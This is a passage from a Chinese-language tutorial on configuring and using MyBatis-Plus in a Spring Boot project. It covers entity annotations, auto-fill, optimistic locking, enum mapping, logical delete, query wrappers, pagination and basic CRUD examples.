<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/db?useUnicode=true&amp;characterEncoding=UTF-8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br></pre></td></tr></table></figure>

<p>6、启动类需要添加 @MapperScan(“mapper所在的包”)，否则无法加载 Mppaer bean。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.southwind.mybatisplus.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisplusApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MybatisplusApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>7、测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserMapperTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper mapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        mapper.selectList(<span class="literal">null</span>).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="常用注解-1"><a href="#常用注解-1" class="headerlink" title="常用注解"></a>常用注解</h3><blockquote>
<p>@TableName</p>
</blockquote>
<p>映射数据库的表名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableName;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Account</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@TableId</p>
</blockquote>
<p>设置主键映射，value 映射主键字段名</p>
<p>type 设置主键类型，主键的生成策略，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AUTO(<span class="number">0</span>),</span><br><span class="line">NONE(<span class="number">1</span>),</span><br><span class="line">INPUT(<span class="number">2</span>),</span><br><span class="line">ASSIGN_ID(<span class="number">3</span>),</span><br><span class="line">ASSIGN_UUID(<span class="number">4</span>),</span><br><span class="line"><span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">ID_WORKER(<span class="number">3</span>),</span><br><span class="line"><span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">ID_WORKER_STR(<span class="number">3</span>),</span><br><span class="line"><span class="comment">/** <span class="doctag">@deprecated</span> */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">UUID(<span class="number">4</span>);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>AUTO</td>
<td>数据库自增</td>
</tr>
<tr>
<td>NONE</td>
<td>MP set 主键，雪花算法实现,生成随机id</td>
</tr>
<tr>
<td>INPUT</td>
<td>需要开发者手动赋值</td>
</tr>
<tr>
<td>ASSIGN_ID</td>
<td>MP 分配 ID，Long、Integer、String</td>
</tr>
<tr>
<td>ASSIGN_UUID</td>
<td>分配 UUID，String</td>
</tr>
</tbody></table>
<p>INPUT 如果开发者没有手动赋值，则数据库通过自增的方式给主键赋值，如果开发者手动赋值，则存入该值。</p>
<p>AUTO 默认就是数据库自增，开发者无需赋值。数据库表需要设置自增，否则会报错。手动赋值还是会按数据自增。</p>
<p>ASSIGN_ID MP 自动赋值，雪花算法。</p>
<p>ASSIGN_UUID 主键的数据类型必须是 String，自动生成 UUID 进行赋值，生成的随机id是string的。</p>
<blockquote>
<p>@TableField</p>
</blockquote>
<p>映射非主键字段，value 映射字段名</p>
<p>exist 表示是否为数据库字段 false，如果实体类中的成员变量在数据库中没有对应的字段，则可以使用 exist，VO、DTO</p>
<p>select 表示是否查询该字段</p>
<p>fill 表示是否自动填充，将对象存入数据库的时候，由 MyBatis Plus 自动给某些字段赋值，create_time、update_time</p>
<p>1、给表添加 create_time、update_time 字段</p>
<p>2、实体类中添加成员变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.FieldFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableField;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableId;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableName;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、创建自动填充处理器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.handler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.handlers.MetaObjectHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.reflection.MetaObject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMetaObjectHandler</span> <span class="keyword">implements</span> <span class="title class_">MetaObjectHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setFieldValByName(<span class="string">&quot;createTime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>(),metaObject);</span><br><span class="line">        <span class="built_in">this</span>.setFieldValByName(<span class="string">&quot;updateTime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>(),metaObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setFieldValByName(<span class="string">&quot;updateTime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Date</span>(),metaObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@Version</p>
</blockquote>
<p>标记乐观锁，通过 version 字段来保证数据的安全性，当修改数据的时候，会以 version 作为条件，当条件成立的时候才会修改成功。</p>
<p>version &#x3D; 2</p>
<p>线程 1:update … set version &#x3D; 2  where version &#x3D; 1</p>
<p>线程2 ：update … set version &#x3D; 2 where version &#x3D; 1</p>
<p>1、数据库表添加 version 字段，默认值为 1</p>
<p>2、实体类添加 version 成员变量，并且添加 @Version </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.*;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、注册配置类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.OptimisticLockerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisPlusConfig</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> OptimisticLockerInterceptor <span class="title function_">optimisticLockerInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OptimisticLockerInterceptor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@EnumValue</p>
</blockquote>
<p>1、通用枚举类注解，将数据库字段映射成实体类的枚举类型成员变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.enums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.EnumValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">StatusEnum</span> &#123;</span><br><span class="line">    WORK(<span class="number">1</span>,<span class="string">&quot;上班&quot;</span>),</span><br><span class="line">    REST(<span class="number">0</span>,<span class="string">&quot;休息&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StatusEnum(Integer code, String msg) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@EnumValue</span></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.*;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.enums.StatusEnum;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line">    <span class="keyword">private</span> StatusEnum status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>application.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">type-enums-package:</span> </span><br><span class="line">  <span class="string">com.southwind.mybatisplus.enums</span></span><br></pre></td></tr></table></figure>

<p>2、实现接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.enums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.enums.IEnum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">AgeEnum</span> <span class="keyword">implements</span> <span class="title class_">IEnum</span>&lt;Integer&gt; &#123;</span><br><span class="line">    ONE(<span class="number">1</span>,<span class="string">&quot;一岁&quot;</span>),</span><br><span class="line">    TWO(<span class="number">2</span>,<span class="string">&quot;两岁&quot;</span>),</span><br><span class="line">    THREE(<span class="number">3</span>,<span class="string">&quot;三岁&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    AgeEnum(Integer code, String msg) &#123;</span><br><span class="line">        <span class="built_in">this</span>.code = code;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>@TableLogic</p>
</blockquote>
<p>映射逻辑删除</p>
<p>1、数据表添加 deleted 字段</p>
<p>2、实体类添加注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.*;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.enums.AgeEnum;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.enums.StatusEnum;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(value = &quot;user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;name&quot;,select = false)</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> AgeEnum age;</span><br><span class="line">    <span class="meta">@TableField(exist = false)</span></span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;</span><br><span class="line">    <span class="meta">@Version</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line">    <span class="meta">@TableField(value = &quot;status&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> StatusEnum statusEnum;</span><br><span class="line">    <span class="meta">@TableLogic</span></span><br><span class="line">    <span class="keyword">private</span> Integer deleted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、application.yml 添加配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">global-config:</span></span><br><span class="line">  <span class="attr">db-config:</span></span><br><span class="line">    <span class="attr">logic-not-delete-value:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">logic-delete-value:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>



<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mapper.selectList(null);</span></span><br><span class="line"><span class="type">QueryWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>();</span><br><span class="line"><span class="comment">//        Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;name&quot;,&quot;小红&quot;);</span></span><br><span class="line"><span class="comment">//        map.put(&quot;age&quot;,3);</span></span><br><span class="line"><span class="comment">//        wrapper.allEq(map);  // 多个条件</span></span><br><span class="line"><span class="comment">//        wrapper.gt(&quot;age&quot;,2); // 大于2</span></span><br><span class="line"><span class="comment">//        wrapper.ne(&quot;name&quot;,&quot;小红&quot;); // 不等于</span></span><br><span class="line"><span class="comment">//        wrapper.ge(&quot;age&quot;,2);  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//like &#x27;%小&#x27;</span></span><br><span class="line"><span class="comment">//        wrapper.likeLeft(&quot;name&quot;,&quot;小&quot;);</span></span><br><span class="line"><span class="comment">//like &#x27;小%&#x27;</span></span><br><span class="line"><span class="comment">//        wrapper.likeRight(&quot;name&quot;,&quot;小&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//inSQL 联合查询</span></span><br><span class="line"><span class="comment">//        wrapper.inSql(&quot;id&quot;,&quot;select id from user where id &lt; 10&quot;);</span></span><br><span class="line"><span class="comment">//        wrapper.inSql(&quot;age&quot;,&quot;select age from user where age &gt; 3&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        wrapper.orderByDesc(&quot;age&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        wrapper.orderByAsc(&quot;age&quot;);</span></span><br><span class="line"><span class="comment">//        wrapper.having(&quot;id &gt; 8&quot;);</span></span><br><span class="line"></span><br><span class="line">mapper.selectList(wrapper).forEach(System.out::println);</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//        System.out.println(mapper.selectById(7));</span></span><br><span class="line"><span class="comment">//        mapper.selectBatchIds(Arrays.asList(7,8,9)).forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Map 只能做等值判断，逻辑判断需要使用 Wrapper 来处理</span></span><br><span class="line"><span class="comment">//        Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;id&quot;,7);</span></span><br><span class="line"><span class="comment">//        mapper.selectByMap(map).forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"><span class="type">QueryWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>();</span><br><span class="line">wrapper.eq(<span class="string">&quot;id&quot;</span>,<span class="number">7</span>);</span><br><span class="line"><span class="comment">////        System.out.println(mapper.selectCount(wrapper));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        //将查询的结果集封装到Map中</span></span><br><span class="line"><span class="comment">//        mapper.selectMaps(wrapper).forEach(System.out::println);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;-------------------&quot;);</span></span><br><span class="line"><span class="comment">//        mapper.selectList(wrapper).forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 分页操作配置类(加到配置类中)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> PaginationInterceptor <span class="title function_">paginationInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PaginationInterceptor</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="comment">//        Page&lt;User&gt; page = new Page&lt;&gt;(2,2);</span></span><br><span class="line"><span class="comment">//        Page&lt;User&gt; result = mapper.selectPage(page,null);</span></span><br><span class="line"><span class="comment">//        System.out.println(result.getSize());</span></span><br><span class="line"><span class="comment">//        System.out.println(result.getTotal());</span></span><br><span class="line"><span class="comment">//        result.getRecords().forEach(System.out::println);</span></span><br><span class="line"><span class="comment">// 查询结果封装到map集合</span></span><br><span class="line"><span class="comment">//        Page&lt;Map&lt;String,Object&gt;&gt; page = new Page&lt;&gt;(1,2);</span></span><br><span class="line"><span class="comment">//        mapper.selectMapsPage(page,null).getRecords().forEach(System.out::println);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        mapper.selectObjs(null).forEach(System.out::println);</span></span><br><span class="line"><span class="comment">// 只能查询一条数据，否则报错</span></span><br><span class="line"><span class="comment">//        mapper,selectOne()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">System.out.println(mapper.selectOne(wrapper));</span><br></pre></td></tr></table></figure>



<h3 id="自定义-SQL（多表关联查询）"><a href="#自定义-SQL（多表关联查询）" class="headerlink" title="自定义 SQL（多表关联查询）"></a>自定义 SQL（多表关联查询）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductVO</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer category;</span><br><span class="line">    <span class="keyword">private</span> Integer count;</span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line">    <span class="keyword">private</span> Integer userId;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.entity.ProductVO;</span><br><span class="line"><span class="keyword">import</span> com.southwind.mybatisplus.entity.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select p.*,u.name userName from product p,user u where p.user_id = u.id and u.id = #&#123;id&#125;&quot;)</span></span><br><span class="line">    List&lt;ProductVO&gt; <span class="title function_">productList</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">user.setTitle(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line">user.setAge(<span class="number">22</span>);</span><br><span class="line">mapper.insert(user);</span><br><span class="line">System.out.println(user);</span><br></pre></td></tr></table></figure>



<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mapper.deleteById(1);</span></span><br><span class="line"><span class="comment">//        mapper.deleteBatchIds(Arrays.asList(7,8));</span></span><br><span class="line"><span class="comment">//        QueryWrapper wrapper = new QueryWrapper();</span></span><br><span class="line"><span class="comment">//        wrapper.eq(&quot;age&quot;,14);</span></span><br><span class="line"><span class="comment">//        mapper.delete(wrapper);</span></span><br><span class="line"></span><br><span class="line">Map&lt;String,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;id&quot;</span>,<span class="number">10</span>);</span><br><span class="line">mapper.deleteByMap(map);</span><br></pre></td></tr></table></figure>



<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//        //update ... version = 3 where version = 2</span><br><span class="line">//        User user = mapper.selectById(7);</span><br><span class="line">//        user.setTitle(&quot;一号&quot;);</span><br><span class="line">//</span><br><span class="line">//        //update ... version = 3 where version = 2</span><br><span class="line">//        User user1 = mapper.selectById(7);</span><br><span class="line">//        user1.setTitle(&quot;二号&quot;);</span><br><span class="line">//</span><br><span class="line">//        mapper.updateById(user1);</span><br><span class="line">//        mapper.updateById(user);</span><br><span class="line"></span><br><span class="line">User user = mapper.selectById(1);</span><br><span class="line">user.setTitle(&quot;小红&quot;);</span><br><span class="line">QueryWrapper wrapper = new QueryWrapper();</span><br><span class="line">wrapper.eq(&quot;age&quot;,22);</span><br><span class="line">mapper.update(user,wrapper);</span><br></pre></td></tr></table></figure>



<h3 id="MyBatisPlus-自动生成"><a href="#MyBatisPlus-自动生成" class="headerlink" title="MyBatisPlus 自动生成"></a>MyBatisPlus 自动生成</h3><p>根据数据表自动生成实体类、Mapper、Service、ServiceImpl、Controller</p>
<p>1、pom.xml 导入 MyBatis Plus Generator</p>
